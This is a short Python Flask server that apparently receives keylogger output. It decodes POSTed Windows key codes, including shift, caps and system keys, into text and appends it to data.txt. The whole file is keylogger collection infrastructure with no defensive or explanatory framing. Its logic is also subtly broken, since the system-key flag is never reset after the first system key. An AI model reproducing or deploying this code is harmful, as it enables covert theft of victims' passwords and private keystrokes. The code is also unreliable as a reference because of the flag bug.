from flask import Flask, request
import re
app = Flask(__name__)

sys_keys = {8: "Backspace", 9: 'TAB', 162: "LCtrl", 163: "RCtrl",  27: "Escape", 20: "CapsLock", 160: "LShift", 161: "RShift",
            13: "Enter", 164: "LAlt", 165: "RAlt", 91: "Windows", 
            93: "MenuKey", 37: "ArrowLeft", 38: "ArrowUp", 39: "ArrowRight", 40: "ArrowDown", 32: "Space"}

upper_keys = {20: "CapsLock", 160: "LShift", 161: "RShift"}

@app.route('/', methods=['POST'])
def read_data():
    data = request.get_json()
    print(data)
    is_upper_arr = data['is_upper']
    value_arr = data['value']

    is_syskey = False
    characters = ""
    for i, value in enumerate(value_arr):       
        character = ""
        value = int(value)
        if value in sys_keys.keys():
            is_syskey = True

        if is_syskey:
            character = f"[{sys_keys[value]}]"
        else:
            if 0 <= value <= 127: # ASCII
                character = chr(value)
                is_character = re.match(r"[a-zA-Z]", character)
                if is_character and int(is_upper_arr[i]) == 0:
                    character = character.lower()
            else: # Special Symbols
                is_shift_upper = 0
                if int(is_upper_arr[i]) == 1:
                    is_shift_upper = 1
                character = f"[{is_shift_upper} : {value}]"

        characters += character

    with open('data.txt', 'a') as f:
        f.write(characters)

    return "OK"
        
if __name__ == "__main__":
    app.run(debug=True, host="x.x.x.x", port=5000)
